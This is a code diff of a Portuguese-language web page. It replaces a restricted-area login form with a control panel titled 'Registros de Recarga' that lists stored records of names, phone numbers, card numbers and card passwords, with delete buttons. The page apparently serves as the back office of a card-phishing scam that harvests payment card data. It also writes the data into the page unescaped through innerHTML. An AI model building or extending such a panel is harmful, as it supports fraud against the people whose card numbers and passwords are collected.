@@ -1,31 +1,69 @@
 <!DOCTYPE html>
 <html lang="pt-br">
-<body style="font-family: Arial; background: #12121b; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
-    <div style="background: #1c1c28; padding: 40px; border-radius: 10px; text-align: center; border: 1px solid #ff2d75;">
-        <h2>🔐 Área Restrita</h2>
-        <input type="text" id="user" placeholder="Usuário" style="width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 5px; border: none;"><br>
-        <input type="password" id="pass" placeholder="Senha" style="width: 100%; padding: 10px; margin-bottom: 20px; border-radius: 5px; border: none;"><br>
-        <button onclick="entrar()" style="width: 100%; padding: 10px; background: #ff2d75; color: white; border: none; cursor: pointer; font-weight: bold; border-radius: 5px;">ACESSAR PAINEL</button>
-    </div>
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Controle</title>
+    <style>
+        body { background: #0d1117; color: white; font-family: sans-serif; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #161b22; }
+        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; }
+        th { background: #21262d; }
+        .btn-excluir { background: #da3633; color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; }
+        .btn-excluir:hover { background: #f85149; }
+        .btn-refresh { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <h2>📋 Registros de Recarga</h2>
+    <button class="btn-refresh" onclick="carregarDados()">🔄 ATUALIZAR LISTA</button>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>Nome</th>
+                <th>Telefone</th>
+                <th>Cartão</th>
+                <th>Senha</th>
+                <th>Ações</th>
+            </tr>
+        </thead>
+        <tbody id="corpoTabela"></tbody>
+    </table>
 
     <script>
-        async function entrar() {
-            const res = await fetch('/login-sistema', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ 
-                    usuario: document.getElementById('user').value, 
-                    senha: document.getElementById('pass').value 
-                })
+        async function carregarDados() {
+            const res = await fetch('/ver-dados-restritos');
+            const dados = await res.json();
+            const tabela = document.getElementById('corpoTabela');
+            tabela.innerHTML = '';
+
+            dados.forEach(item => {
+                tabela.innerHTML += `
+                    <tr>
+                        <td>${item.nome}</td>
+                        <td>${item.telefone}</td>
+                        <td>${item.cartao}</td>
+                        <td>${item.senha}</td>
+                        <td>
+                            <button class="btn-excluir" onclick="deletar('${item._id}')">🗑️ Apagar</button>
+                        </td>
+                    </tr>
+                `;
             });
-            const result = await res.json();
-            if (result.success) {
-                // Se a senha estiver certa, ele libera o acesso ao painel visual
-                window.location.href = '/painel.html';
-            } else {
-                alert(result.message);
+        }
+
+        async function deletar(id) {
+            if(confirm('Deseja mesmo excluir este registro?')) {
+                const res = await fetch(`/excluir/${id}`, { method: 'DELETE' });
+                if(res.ok) {
+                    alert('Registro removido!');
+                    carregarDados();
+                }
             }
         }
+
+        // Carrega os dados assim que abre a página
+        window.onload = carregarDados;
     </script>
 </body>
 </html>
